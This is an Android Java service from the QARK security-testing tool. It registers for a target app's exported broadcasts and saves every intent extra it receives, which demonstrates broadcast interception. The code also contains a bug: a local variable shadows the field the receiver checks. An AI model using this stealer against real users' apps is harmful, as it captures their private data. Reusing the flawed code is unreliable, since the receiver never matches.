/*
 * Copyright 2015 LinkedIn Corp. Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 */

package com.secbro.qark.intentsniffer.services;

import android.app.IntentService;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.Context;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;

import com.secbro.qark.R;
import com.secbro.qark.TopLevelActivity;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p/>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class BroadcastStealerService extends Service {

    private static final String LOG_TAG = BroadcastStealerService.class.getSimpleName();
    private String[] intentNames = {};


    private final BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            for(int i=0;i<intentNames.length;i++) {
                Bundle bundle = intent.getExtras();
                if (action.equals(intentNames[i])) {
                    for (String key : bundle.keySet()) {
                        Object value = bundle.get(key);
                        SharedPreferences prefs = getSharedPreferences(
                                getPackageName(), Context.MODE_PRIVATE);
                        prefs.edit().putString("foo", prefs.getString("foo", "Listening...") + "\n " + "KEY: " + key + "VALUE: " + value.toString()).apply();
                    }
                    Log.i("BroadcastStealerService", "intent received");
                }
            }
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        IntentFilter filter = new IntentFilter();
        //filter.addAction("android.provider.Telephony.SMS_RECEIVED");
        String[] intentNames = getResources().getStringArray(R.array.exportedBroadcasts);
        for (String name : intentNames){
            filter.addAction(getResources().getString(getResources().getIdentifier(name, "string", TopLevelActivity.PACKAGE_NAME)));
        }
        registerReceiver(receiver, filter);
    }

    @Override
    public void onDestroy() {
        unregisterReceiver(receiver);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
